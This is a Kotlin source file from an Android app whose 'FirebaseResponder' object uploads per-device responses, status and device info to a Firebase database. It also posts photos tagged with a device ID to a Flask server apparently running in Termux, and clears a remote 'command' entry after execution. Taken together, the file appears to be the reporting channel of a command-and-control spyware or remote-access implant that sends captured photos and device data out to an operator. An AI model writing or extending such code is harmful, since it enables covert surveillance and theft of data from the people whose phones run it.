package com.sanz.epep.data.remote

import android.util.Log
import com.sanz.epep.data.local.PrefsManager
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.File
import java.util.concurrent.TimeUnit

object FirebaseResponder {

    private const val TAG = "FirebaseResponder"
    private val FIREBASE_URL get() = PrefsManager.FIREBASE_URL
    private val deviceId get() = PrefsManager.deviceId
    private fun devicePath() = "$FIREBASE_URL/devices/$deviceId"

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(60, TimeUnit.SECONDS)
        .build()

    // Kirim response teks ke Firebase — path per device
    fun sendResponse(message: String): Boolean {
        return try {
            val json = JSONObject().apply {
                put("message", message)
                put("timestamp", System.currentTimeMillis())
            }
            val body = json.toString().toRequestBody("application/json".toMediaType())
            val request = Request.Builder()
                .url("${devicePath()}/response.json")
                .put(body)
                .build()
            val res = client.newCall(request).execute()
            Log.d(TAG, "sendResponse: ${res.code}")
            res.isSuccessful
        } catch (e: Exception) {
            Log.e(TAG, "sendResponse err: ${e.message}")
            false
        }
    }

    // Kirim status device ke Firebase — path per device
    fun sendStatus(status: Map<String, Any>): Boolean {
        return try {
            val json = JSONObject(status)
            val body = json.toString().toRequestBody("application/json".toMediaType())
            val request = Request.Builder()
                .url("${devicePath()}/status.json")
                .put(body)
                .build()
            val res = client.newCall(request).execute()
            res.isSuccessful
        } catch (e: Exception) {
            Log.e(TAG, "sendStatus err: ${e.message}")
            false
        }
    }

    // Kirim info device saat startup
    fun sendDeviceInfo(info: Map<String, Any>): Boolean {
        return try {
            val json = JSONObject(info)
            val body = json.toString().toRequestBody("application/json".toMediaType())
            val request = Request.Builder()
                .url("${devicePath()}/info.json")
                .put(body)
                .build()
            client.newCall(request).execute().isSuccessful
        } catch (e: Exception) {
            Log.e(TAG, "sendInfo err: ${e.message}")
            false
        }
    }

    // Kirim foto ke Flask di Termux — sertakan device_id
    fun sendPhoto(file: File, caption: String = ""): Boolean {
        return try {
            val flaskUrl = PrefsManager.flaskUrl
            val body = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("photo", file.name, file.asRequestBody("image/jpeg".toMediaType()))
                .addFormDataPart("caption", caption)
                .addFormDataPart("device_id", deviceId)
                .build()
            val request = Request.Builder()
                .url("$flaskUrl/upload_photo")
                .post(body)
                .build()
            val res = client.newCall(request).execute()
            Log.d(TAG, "sendPhoto: ${res.code}")
            res.isSuccessful
        } catch (e: Exception) {
            Log.e(TAG, "sendPhoto err: ${e.message}")
            false
        }
    }

    // Clear command setelah dieksekusi
    fun clearCommand(): Boolean {
        return try {
            val body = "null".toRequestBody("application/json".toMediaType())
            val request = Request.Builder()
                .url("${devicePath()}/command.json")
                .put(body)
                .build()
            client.newCall(request).execute().isSuccessful
        } catch (e: Exception) {
            false
        }
    }
}
